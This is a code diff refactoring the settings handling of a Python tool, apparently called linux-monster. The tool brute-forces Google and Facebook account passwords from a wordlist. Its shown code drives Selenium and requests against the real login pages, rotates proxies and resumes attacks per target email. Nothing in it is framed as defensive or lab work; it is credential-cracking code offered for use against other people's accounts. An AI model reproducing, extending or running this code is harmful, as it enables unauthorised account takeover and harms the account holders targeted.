@@ -33,8 +33,8 @@ green = "\033[1;32m"
   
   
 if os.path.exists('data/settings.json'): 
-  with open('data/settings.json', 'r') as setting_conf:
-    settings = setting_conf.readlines()
+  with open('data/settings.json', 'r') as settingjs:
+    set_json = json.load(settingjs)
 else:
   os.makedirs('data', exist_ok = True)
   with open('data/settings.json', 'w') as new_setting:
@@ -63,87 +63,79 @@ def sanitize_json_bool(value):
 def proxy_status():
   with open('data/settings.json', 'r') as settings:
     setting = settings.readlines()
-    proxy, status = setting[2].split(':')
-    if "true" in status.strip():
+    status = set_json["proxy"]
+    if status == True:
       return f'{green} ON {plain}'
     else:
       return f'{red} OFF {plain}'
         
 def open_settings(modify):
-    ackn_setting = settings[1].split(':')
-    
-    init_proxy = sanitize_json_bool(settings[2].split(':')[1].strip())
-    init_username = settings[3].split(':')[1].replace(",", "").strip('"').strip().strip('"')
-    init_email = settings[4].split(':')[1].replace(",", "").strip('"').strip().strip('"')
-    init_password_path = settings[5].split(':')[1].replace(",","").strip('"').strip().strip('"')
-    
-    if ackn_setting[1] != "false":
+    if set_json["settings"] != False:
       while modify == True:
-          
         setting_var = f'''
-        {blue_bg}𝚂𝚎𝚝𝚝𝚒𝚗𝚐{plain}{yellow}\n
-        [1] 𝙿𝚛𝚘𝚡𝚢
-        [2] 𝙲𝚑𝚊𝚗𝚐𝚎 𝚞𝚜𝚎𝚛𝚗𝚊𝚖𝚎     
+        {blue_bg}𝚂𝚎𝚝𝚝𝚒𝚗𝚐{plain}{purple}\n
+        [1] 𝙿𝚛𝚘𝚡𝚢                  [4] 𝙲𝚑𝚊𝚗𝚐𝚎 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚏𝚒𝚕𝚎
+        [2] 𝙲𝚑𝚊𝚗𝚐𝚎 𝚞𝚜𝚎𝚛𝚗𝚊𝚖𝚎        [5] 𝚂𝚊𝚟𝚎 𝚜𝚎𝚝𝚝𝚒𝚗𝚐𝚜
         [3] 𝙲𝚑𝚊𝚗𝚐𝚎 𝚖𝚊𝚒𝚕 𝚊𝚍𝚍𝚛𝚎𝚜𝚜
-        [4] 𝙲𝚑𝚊𝚗𝚐𝚎 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚏𝚒𝚕𝚎
-        [5] 𝚂𝚊𝚟𝚎 𝚜𝚎𝚝𝚝𝚒𝚗𝚐𝚜
             
         𝙴𝚗𝚝𝚎𝚛 : {plain}'''
         like_to = input(textwrap.dedent(setting_var))
           
         if like_to == "1":
-          proxy_setting = settings[2].split(':')
+          proxy_setting = set_json["proxy"]
           check_proxy = proxy_status()
           if 'on' in check_proxy.lower():
             new_proxy = input(f'{yellow}Would you like to disable proxy : [Yes | No] : {plain}').lower()
             if new_proxy == 'yes':
-              init_proxy = False
+              set_json["proxy"] = False
             else:
-              init_proxy = True
+              set_json["proxy"] = True
           elif 'off' in check_proxy.lower():
             new_proxy = input(f'{yellow}Would you like to enable proxy : [Yes | No] : {plain}').lower()
             if new_proxy == 'yes':
-              init_proxy = True
+              set_json["proxy"] = True
             else:
-              init_proxy = False
+              set_json["proxy"] = False
               
         elif "2" in like_to:
-          print(f'Current username : {blue}{init_username}{plain}')
+          print(f'Current username : {blue}{set_json["username"]}{plain}')
           change_user = input('Would you like to change your username [Yes | No] : ').strip().lower()
           if change_user in ["y", "yes"]:
             new_username = input('Enter your new username : ')
-            init_username = new_username
+            set_json["username"] = new_username.strip()
           else: 
             pass
         elif "3" in like_to:
-          print(f'Your current email: {blue}{init_email}{plain}')
-          change_email = input('Would you like to change this [Yes | No] : ').strip().lower()
+          print(f'Your current email: {blue}{set_json["email address"]}{plain}')
+          change_email = input('Would you like to change this [Yes | No] : ').lower()
+          change_email = change_email.strip()
           if change_email == "yes":
             changing = True
             while changing:
               new_email = input('Enter new email address : \n')
               pattern = r"^[a-zA-Z0-9_+.]+@[a-zA-Z0-9_+]+\.[a-z]{2,3}$"
               if re.search(pattern, new_email):
-                init_email = new_email
-                changing = False
+                set_json["email address"] = new_email.strip()
               else:
                 print(f'\n{red_bg}That wasn\'t an email address!!!{plain}')
+              changing = False
           elif change_email == "no":
             pass
         elif "4" in like_to:
           try:
             pass_holder = f"""
-            Current password file : {init_password_path.strip().split('/')[1]}
+            Current password file : {set_json["password path"]}
             Your new password file must be located in password folder
             """
             print(f'{blue}{textwrap.dedent(pass_holder)} {plain}')
-          except IndexError:
+          except KeyError:
             print(f'{red}No password file found{plain}')
           changing = True
           while changing:
             change = input('Change your password path [Yes | No] : ').lower()
             if change == "yes":
-              new_path = input('New password file name [File_name.txt] : ').strip()
+              new_path = input('New password file name [File_name.txt] : ')
+              new_path = new_path.strip()
               file, ext =  os.path.splitext(new_path)
               if ext == '.txt':
                 if not os.path.exists(f'password/{new_path}'):
@@ -155,26 +147,17 @@ def open_settings(modify):
                       print(f'{red}{new_path} is an empty document, try again{plain}')
                     else:
                       content.close()
-                      init_password_path = f"password/{new_path}"
+                      set_json["password path"] = f"password/{new_path}"
                       changing = False
               else:
                 print(f'{red}Provide a valid .txt document {plain}')
             else:
               changing = False
         elif "5" in like_to:
-          update_setting = {
-          "settings": True,
-          "proxy":init_proxy,
-          "username":init_username,
-          "email address":init_email,
-          "password path":init_password_path
-          }
-
           with open('data/settings.json', 'w') as setting_con:
-            json.dump(update_setting,setting_con,indent = 4)
+            json.dump(set_json,setting_con,indent = 4)
+            setting_con.close()
             modify = False
-            print(f'{blue}𝚁𝚎𝚜𝚝𝚊𝚛𝚝 𝚝𝚑𝚎 𝚙𝚛𝚘𝚐𝚛𝚊𝚖, 𝚃𝚘 𝚞𝚙𝚍𝚊𝚝𝚎 𝚌𝚑𝚊𝚗𝚐𝚎𝚜')
-            sys.exit()
         elif 'exit' in like_to:
           modify = False
   
@@ -226,8 +209,8 @@ def onload_proxy(data = None, pop = None):
       set_.close()
       return None
 
-def onload_file(value):
-  new_value = value.strip().strip('"')
+def onload_file():
+  new_value = set_json["password path"]
   if not os.path.exists(new_value):
     return 'password/passwords.txt'
   else:
@@ -252,15 +235,19 @@ def proxy_errorV(errorLogged = None, terminate = None):
 
 def main():
   os.system('cls' if os.name == 'nt' else 'clear')
-  password_file = settings[5].split(':')[1]
+  password_file = set_json["password path"]
   logging.basicConfig(filename='monster.log', format = "%(asctime)s - %(levelname)s - %(message)s")
   
-  with open(onload_file(password_file), 'r') as file:
-    pass_ = [passw.strip() for passw in file.readlines() if passw.strip()]
+  #makes dictionary loading dynamic
+  def run_brute():
+    with open(onload_file(), 'r') as file:
+      pass_ = [passw.strip() for passw in file.readlines() if passw.strip()]
+      return pass_
     
   save_passwords = open('data/temps.txt', 'a')
     
   def load_banner():
+    os.system('cls' if os.name == 'nt' else 'clear')
     holder = rf"""
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    _,  _ _, _ _,_ _  ,   _, _  _, _, _  _, ___ __, __,
@@ -285,10 +272,10 @@ def main():
   bs = beautifulsoup
   command = True
   while command:
-    command = input(f'{yellow}𝙴𝚗𝚝𝚎𝚛 𝚊 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : {plain}')
+    command = input(f'{yellow}[{blue} 𝙼𝚊𝚒𝚗-𝚖𝚎𝚗𝚞{yellow} ]𝙴𝚗𝚝𝚎𝚛 𝚊 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : {plain}')
     command = command.strip()
     if command.lower() in ['brute', 'brute-force']:
-      if sanitize_json_bool(settings[2].strip()):
+      if set_json["proxy"]:
         temp_disable = input(f'{blue}Temporarily disable proxy for now [Yes | No] : {plain}').lower()
         disable_now = True if temp_disable.strip() == "yes" else False
       br = True
@@ -296,8 +283,7 @@ def main():
         target = """
         𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚝𝚎𝚖𝚙𝚕𝚊𝚝𝚎𝚜
         
-        [1] 𝙶𝚘𝚘𝚐𝚕𝚎 [𝙶-𝚜𝚙𝚕𝚒𝚗𝚝𝚎𝚛]
-        [2] 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝙵𝚋-𝚑𝚊𝚌𝚔2.7]
+        [1] 𝙶𝚘𝚘𝚐𝚕𝚎    [2] 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔 
         [3] 𝙴𝚡𝚒𝚝
         
         """
@@ -340,9 +326,10 @@ def main():
               wait.until(EC.visibility_of_element_located((By.XPATH,'//button[contains(text(), "Next")]')))
               driver.find_element(By.XPATH,'//button[contains(text(), "Next")]').click()
               captcha = []
-            read_mem = memory(email_or_phone,1,None,onload_file(password_file))
+            read_mem = memory(email_or_phone,1,None,onload_file())
             index_h = read_mem.read_()
             i = index_h if index_h != None else 0
+            pass_ = run_brute()
             while i < len(pass_):
               check_password = pass_[i]
               try:
@@ -355,7 +342,7 @@ def main():
                 wait.until(EC.visibility_of_element_located((By.XPATH, '//span[contains(text(), "Wrong password")]')))
                 
                 print(f'{red}Incorrect password : {check_password} {plain}')
-                save_mem = memory(email_or_phone,1,check_password,onload_file(password_file))
+                save_mem = memory(email_or_phone,1,check_password,onload_file())
                 save_mem.update_()
               except selenium.common.exceptions.TimeoutException:
                 
@@ -401,9 +388,10 @@ def main():
           if username_email.lower() in ['exit']:
             break
           
-          read_mem = memory(username_email,2,None,onload_file(password_file))
+          read_mem = memory(username_email,2,None,onload_file())
           index_h = read_mem.read_()
           i = index_h if index_h != None else 0
+          pass_ = run_brute()
           while i < len(pass_):
             check_password = pass_[i]
             caught_proxy = onload_proxy()
@@ -451,7 +439,7 @@ def main():
                   if "incorrect" in page_content:
                     print(f'{red}𝙸𝚗𝚌𝚘𝚛𝚛𝚎𝚌𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍{plain}', flush = True)
                     driver.quit()
-                    save_mem = memory(username_email,2,check_password,onload_file(password_file))
+                    save_mem = memory(username_email,2,check_password,onload_file())
                     save_mem.update_()
                 except selenium.common.exceptions.TimeoutException as sel_timer:
                   page_now = bs(driver.page_source, 'html.parser').text
@@ -516,6 +504,7 @@ def main():
       
         target_url = 'https://www.facebook.com/login.php/?wtsid=rdr_0f3dD3Sv9vasSu1yl&_rdc=2&_rdr#'
         i = 0
+        pass_ = run_brute()
         while i < len(pass_):
           check_password = pass_[i]
           agent = {
@@ -576,8 +565,9 @@ def main():
               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                 𝙲𝚘𝚖𝚖𝚘𝚗  𝚑𝚝𝚖𝚕  𝚝𝚊𝚐𝚜 
               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-              𝙿𝚊𝚐𝚎 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 - 𝚋𝚘𝚍𝚢,
+              𝙿𝚊𝚐𝚎 𝚑𝚎𝚊𝚍 - 𝚑𝚎𝚊𝚍,
               𝙿𝚊𝚐𝚎 𝚝𝚒𝚝𝚕𝚎 - 𝚝𝚒𝚝𝚕𝚎,
+              𝙿𝚊𝚐𝚎 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 - 𝚋𝚘𝚍𝚢,
               𝙻𝚒𝚗𝚔𝚜 - 𝚊,
               𝙿𝚊𝚛𝚊𝚐𝚛𝚊𝚙𝚑 - 𝚙,
               𝙵𝚘𝚛𝚖 - 𝚏𝚘𝚛𝚖 ,
@@ -681,7 +671,6 @@ def main():
     elif command.lower().strip() == 'help':
       subprocess.run(['xdg-open', 'https://github.com/harkerbyte/linux-monster#support'])
     elif command.lower() == 'clear':
-      os.system('cls' if os.name == 'nt' else 'clear')
       load_banner()
     elif command.lower() in ['dev', 'developer']:
       subprocess.run(['xdg-open', 'https://github.com/harkerbyte'])
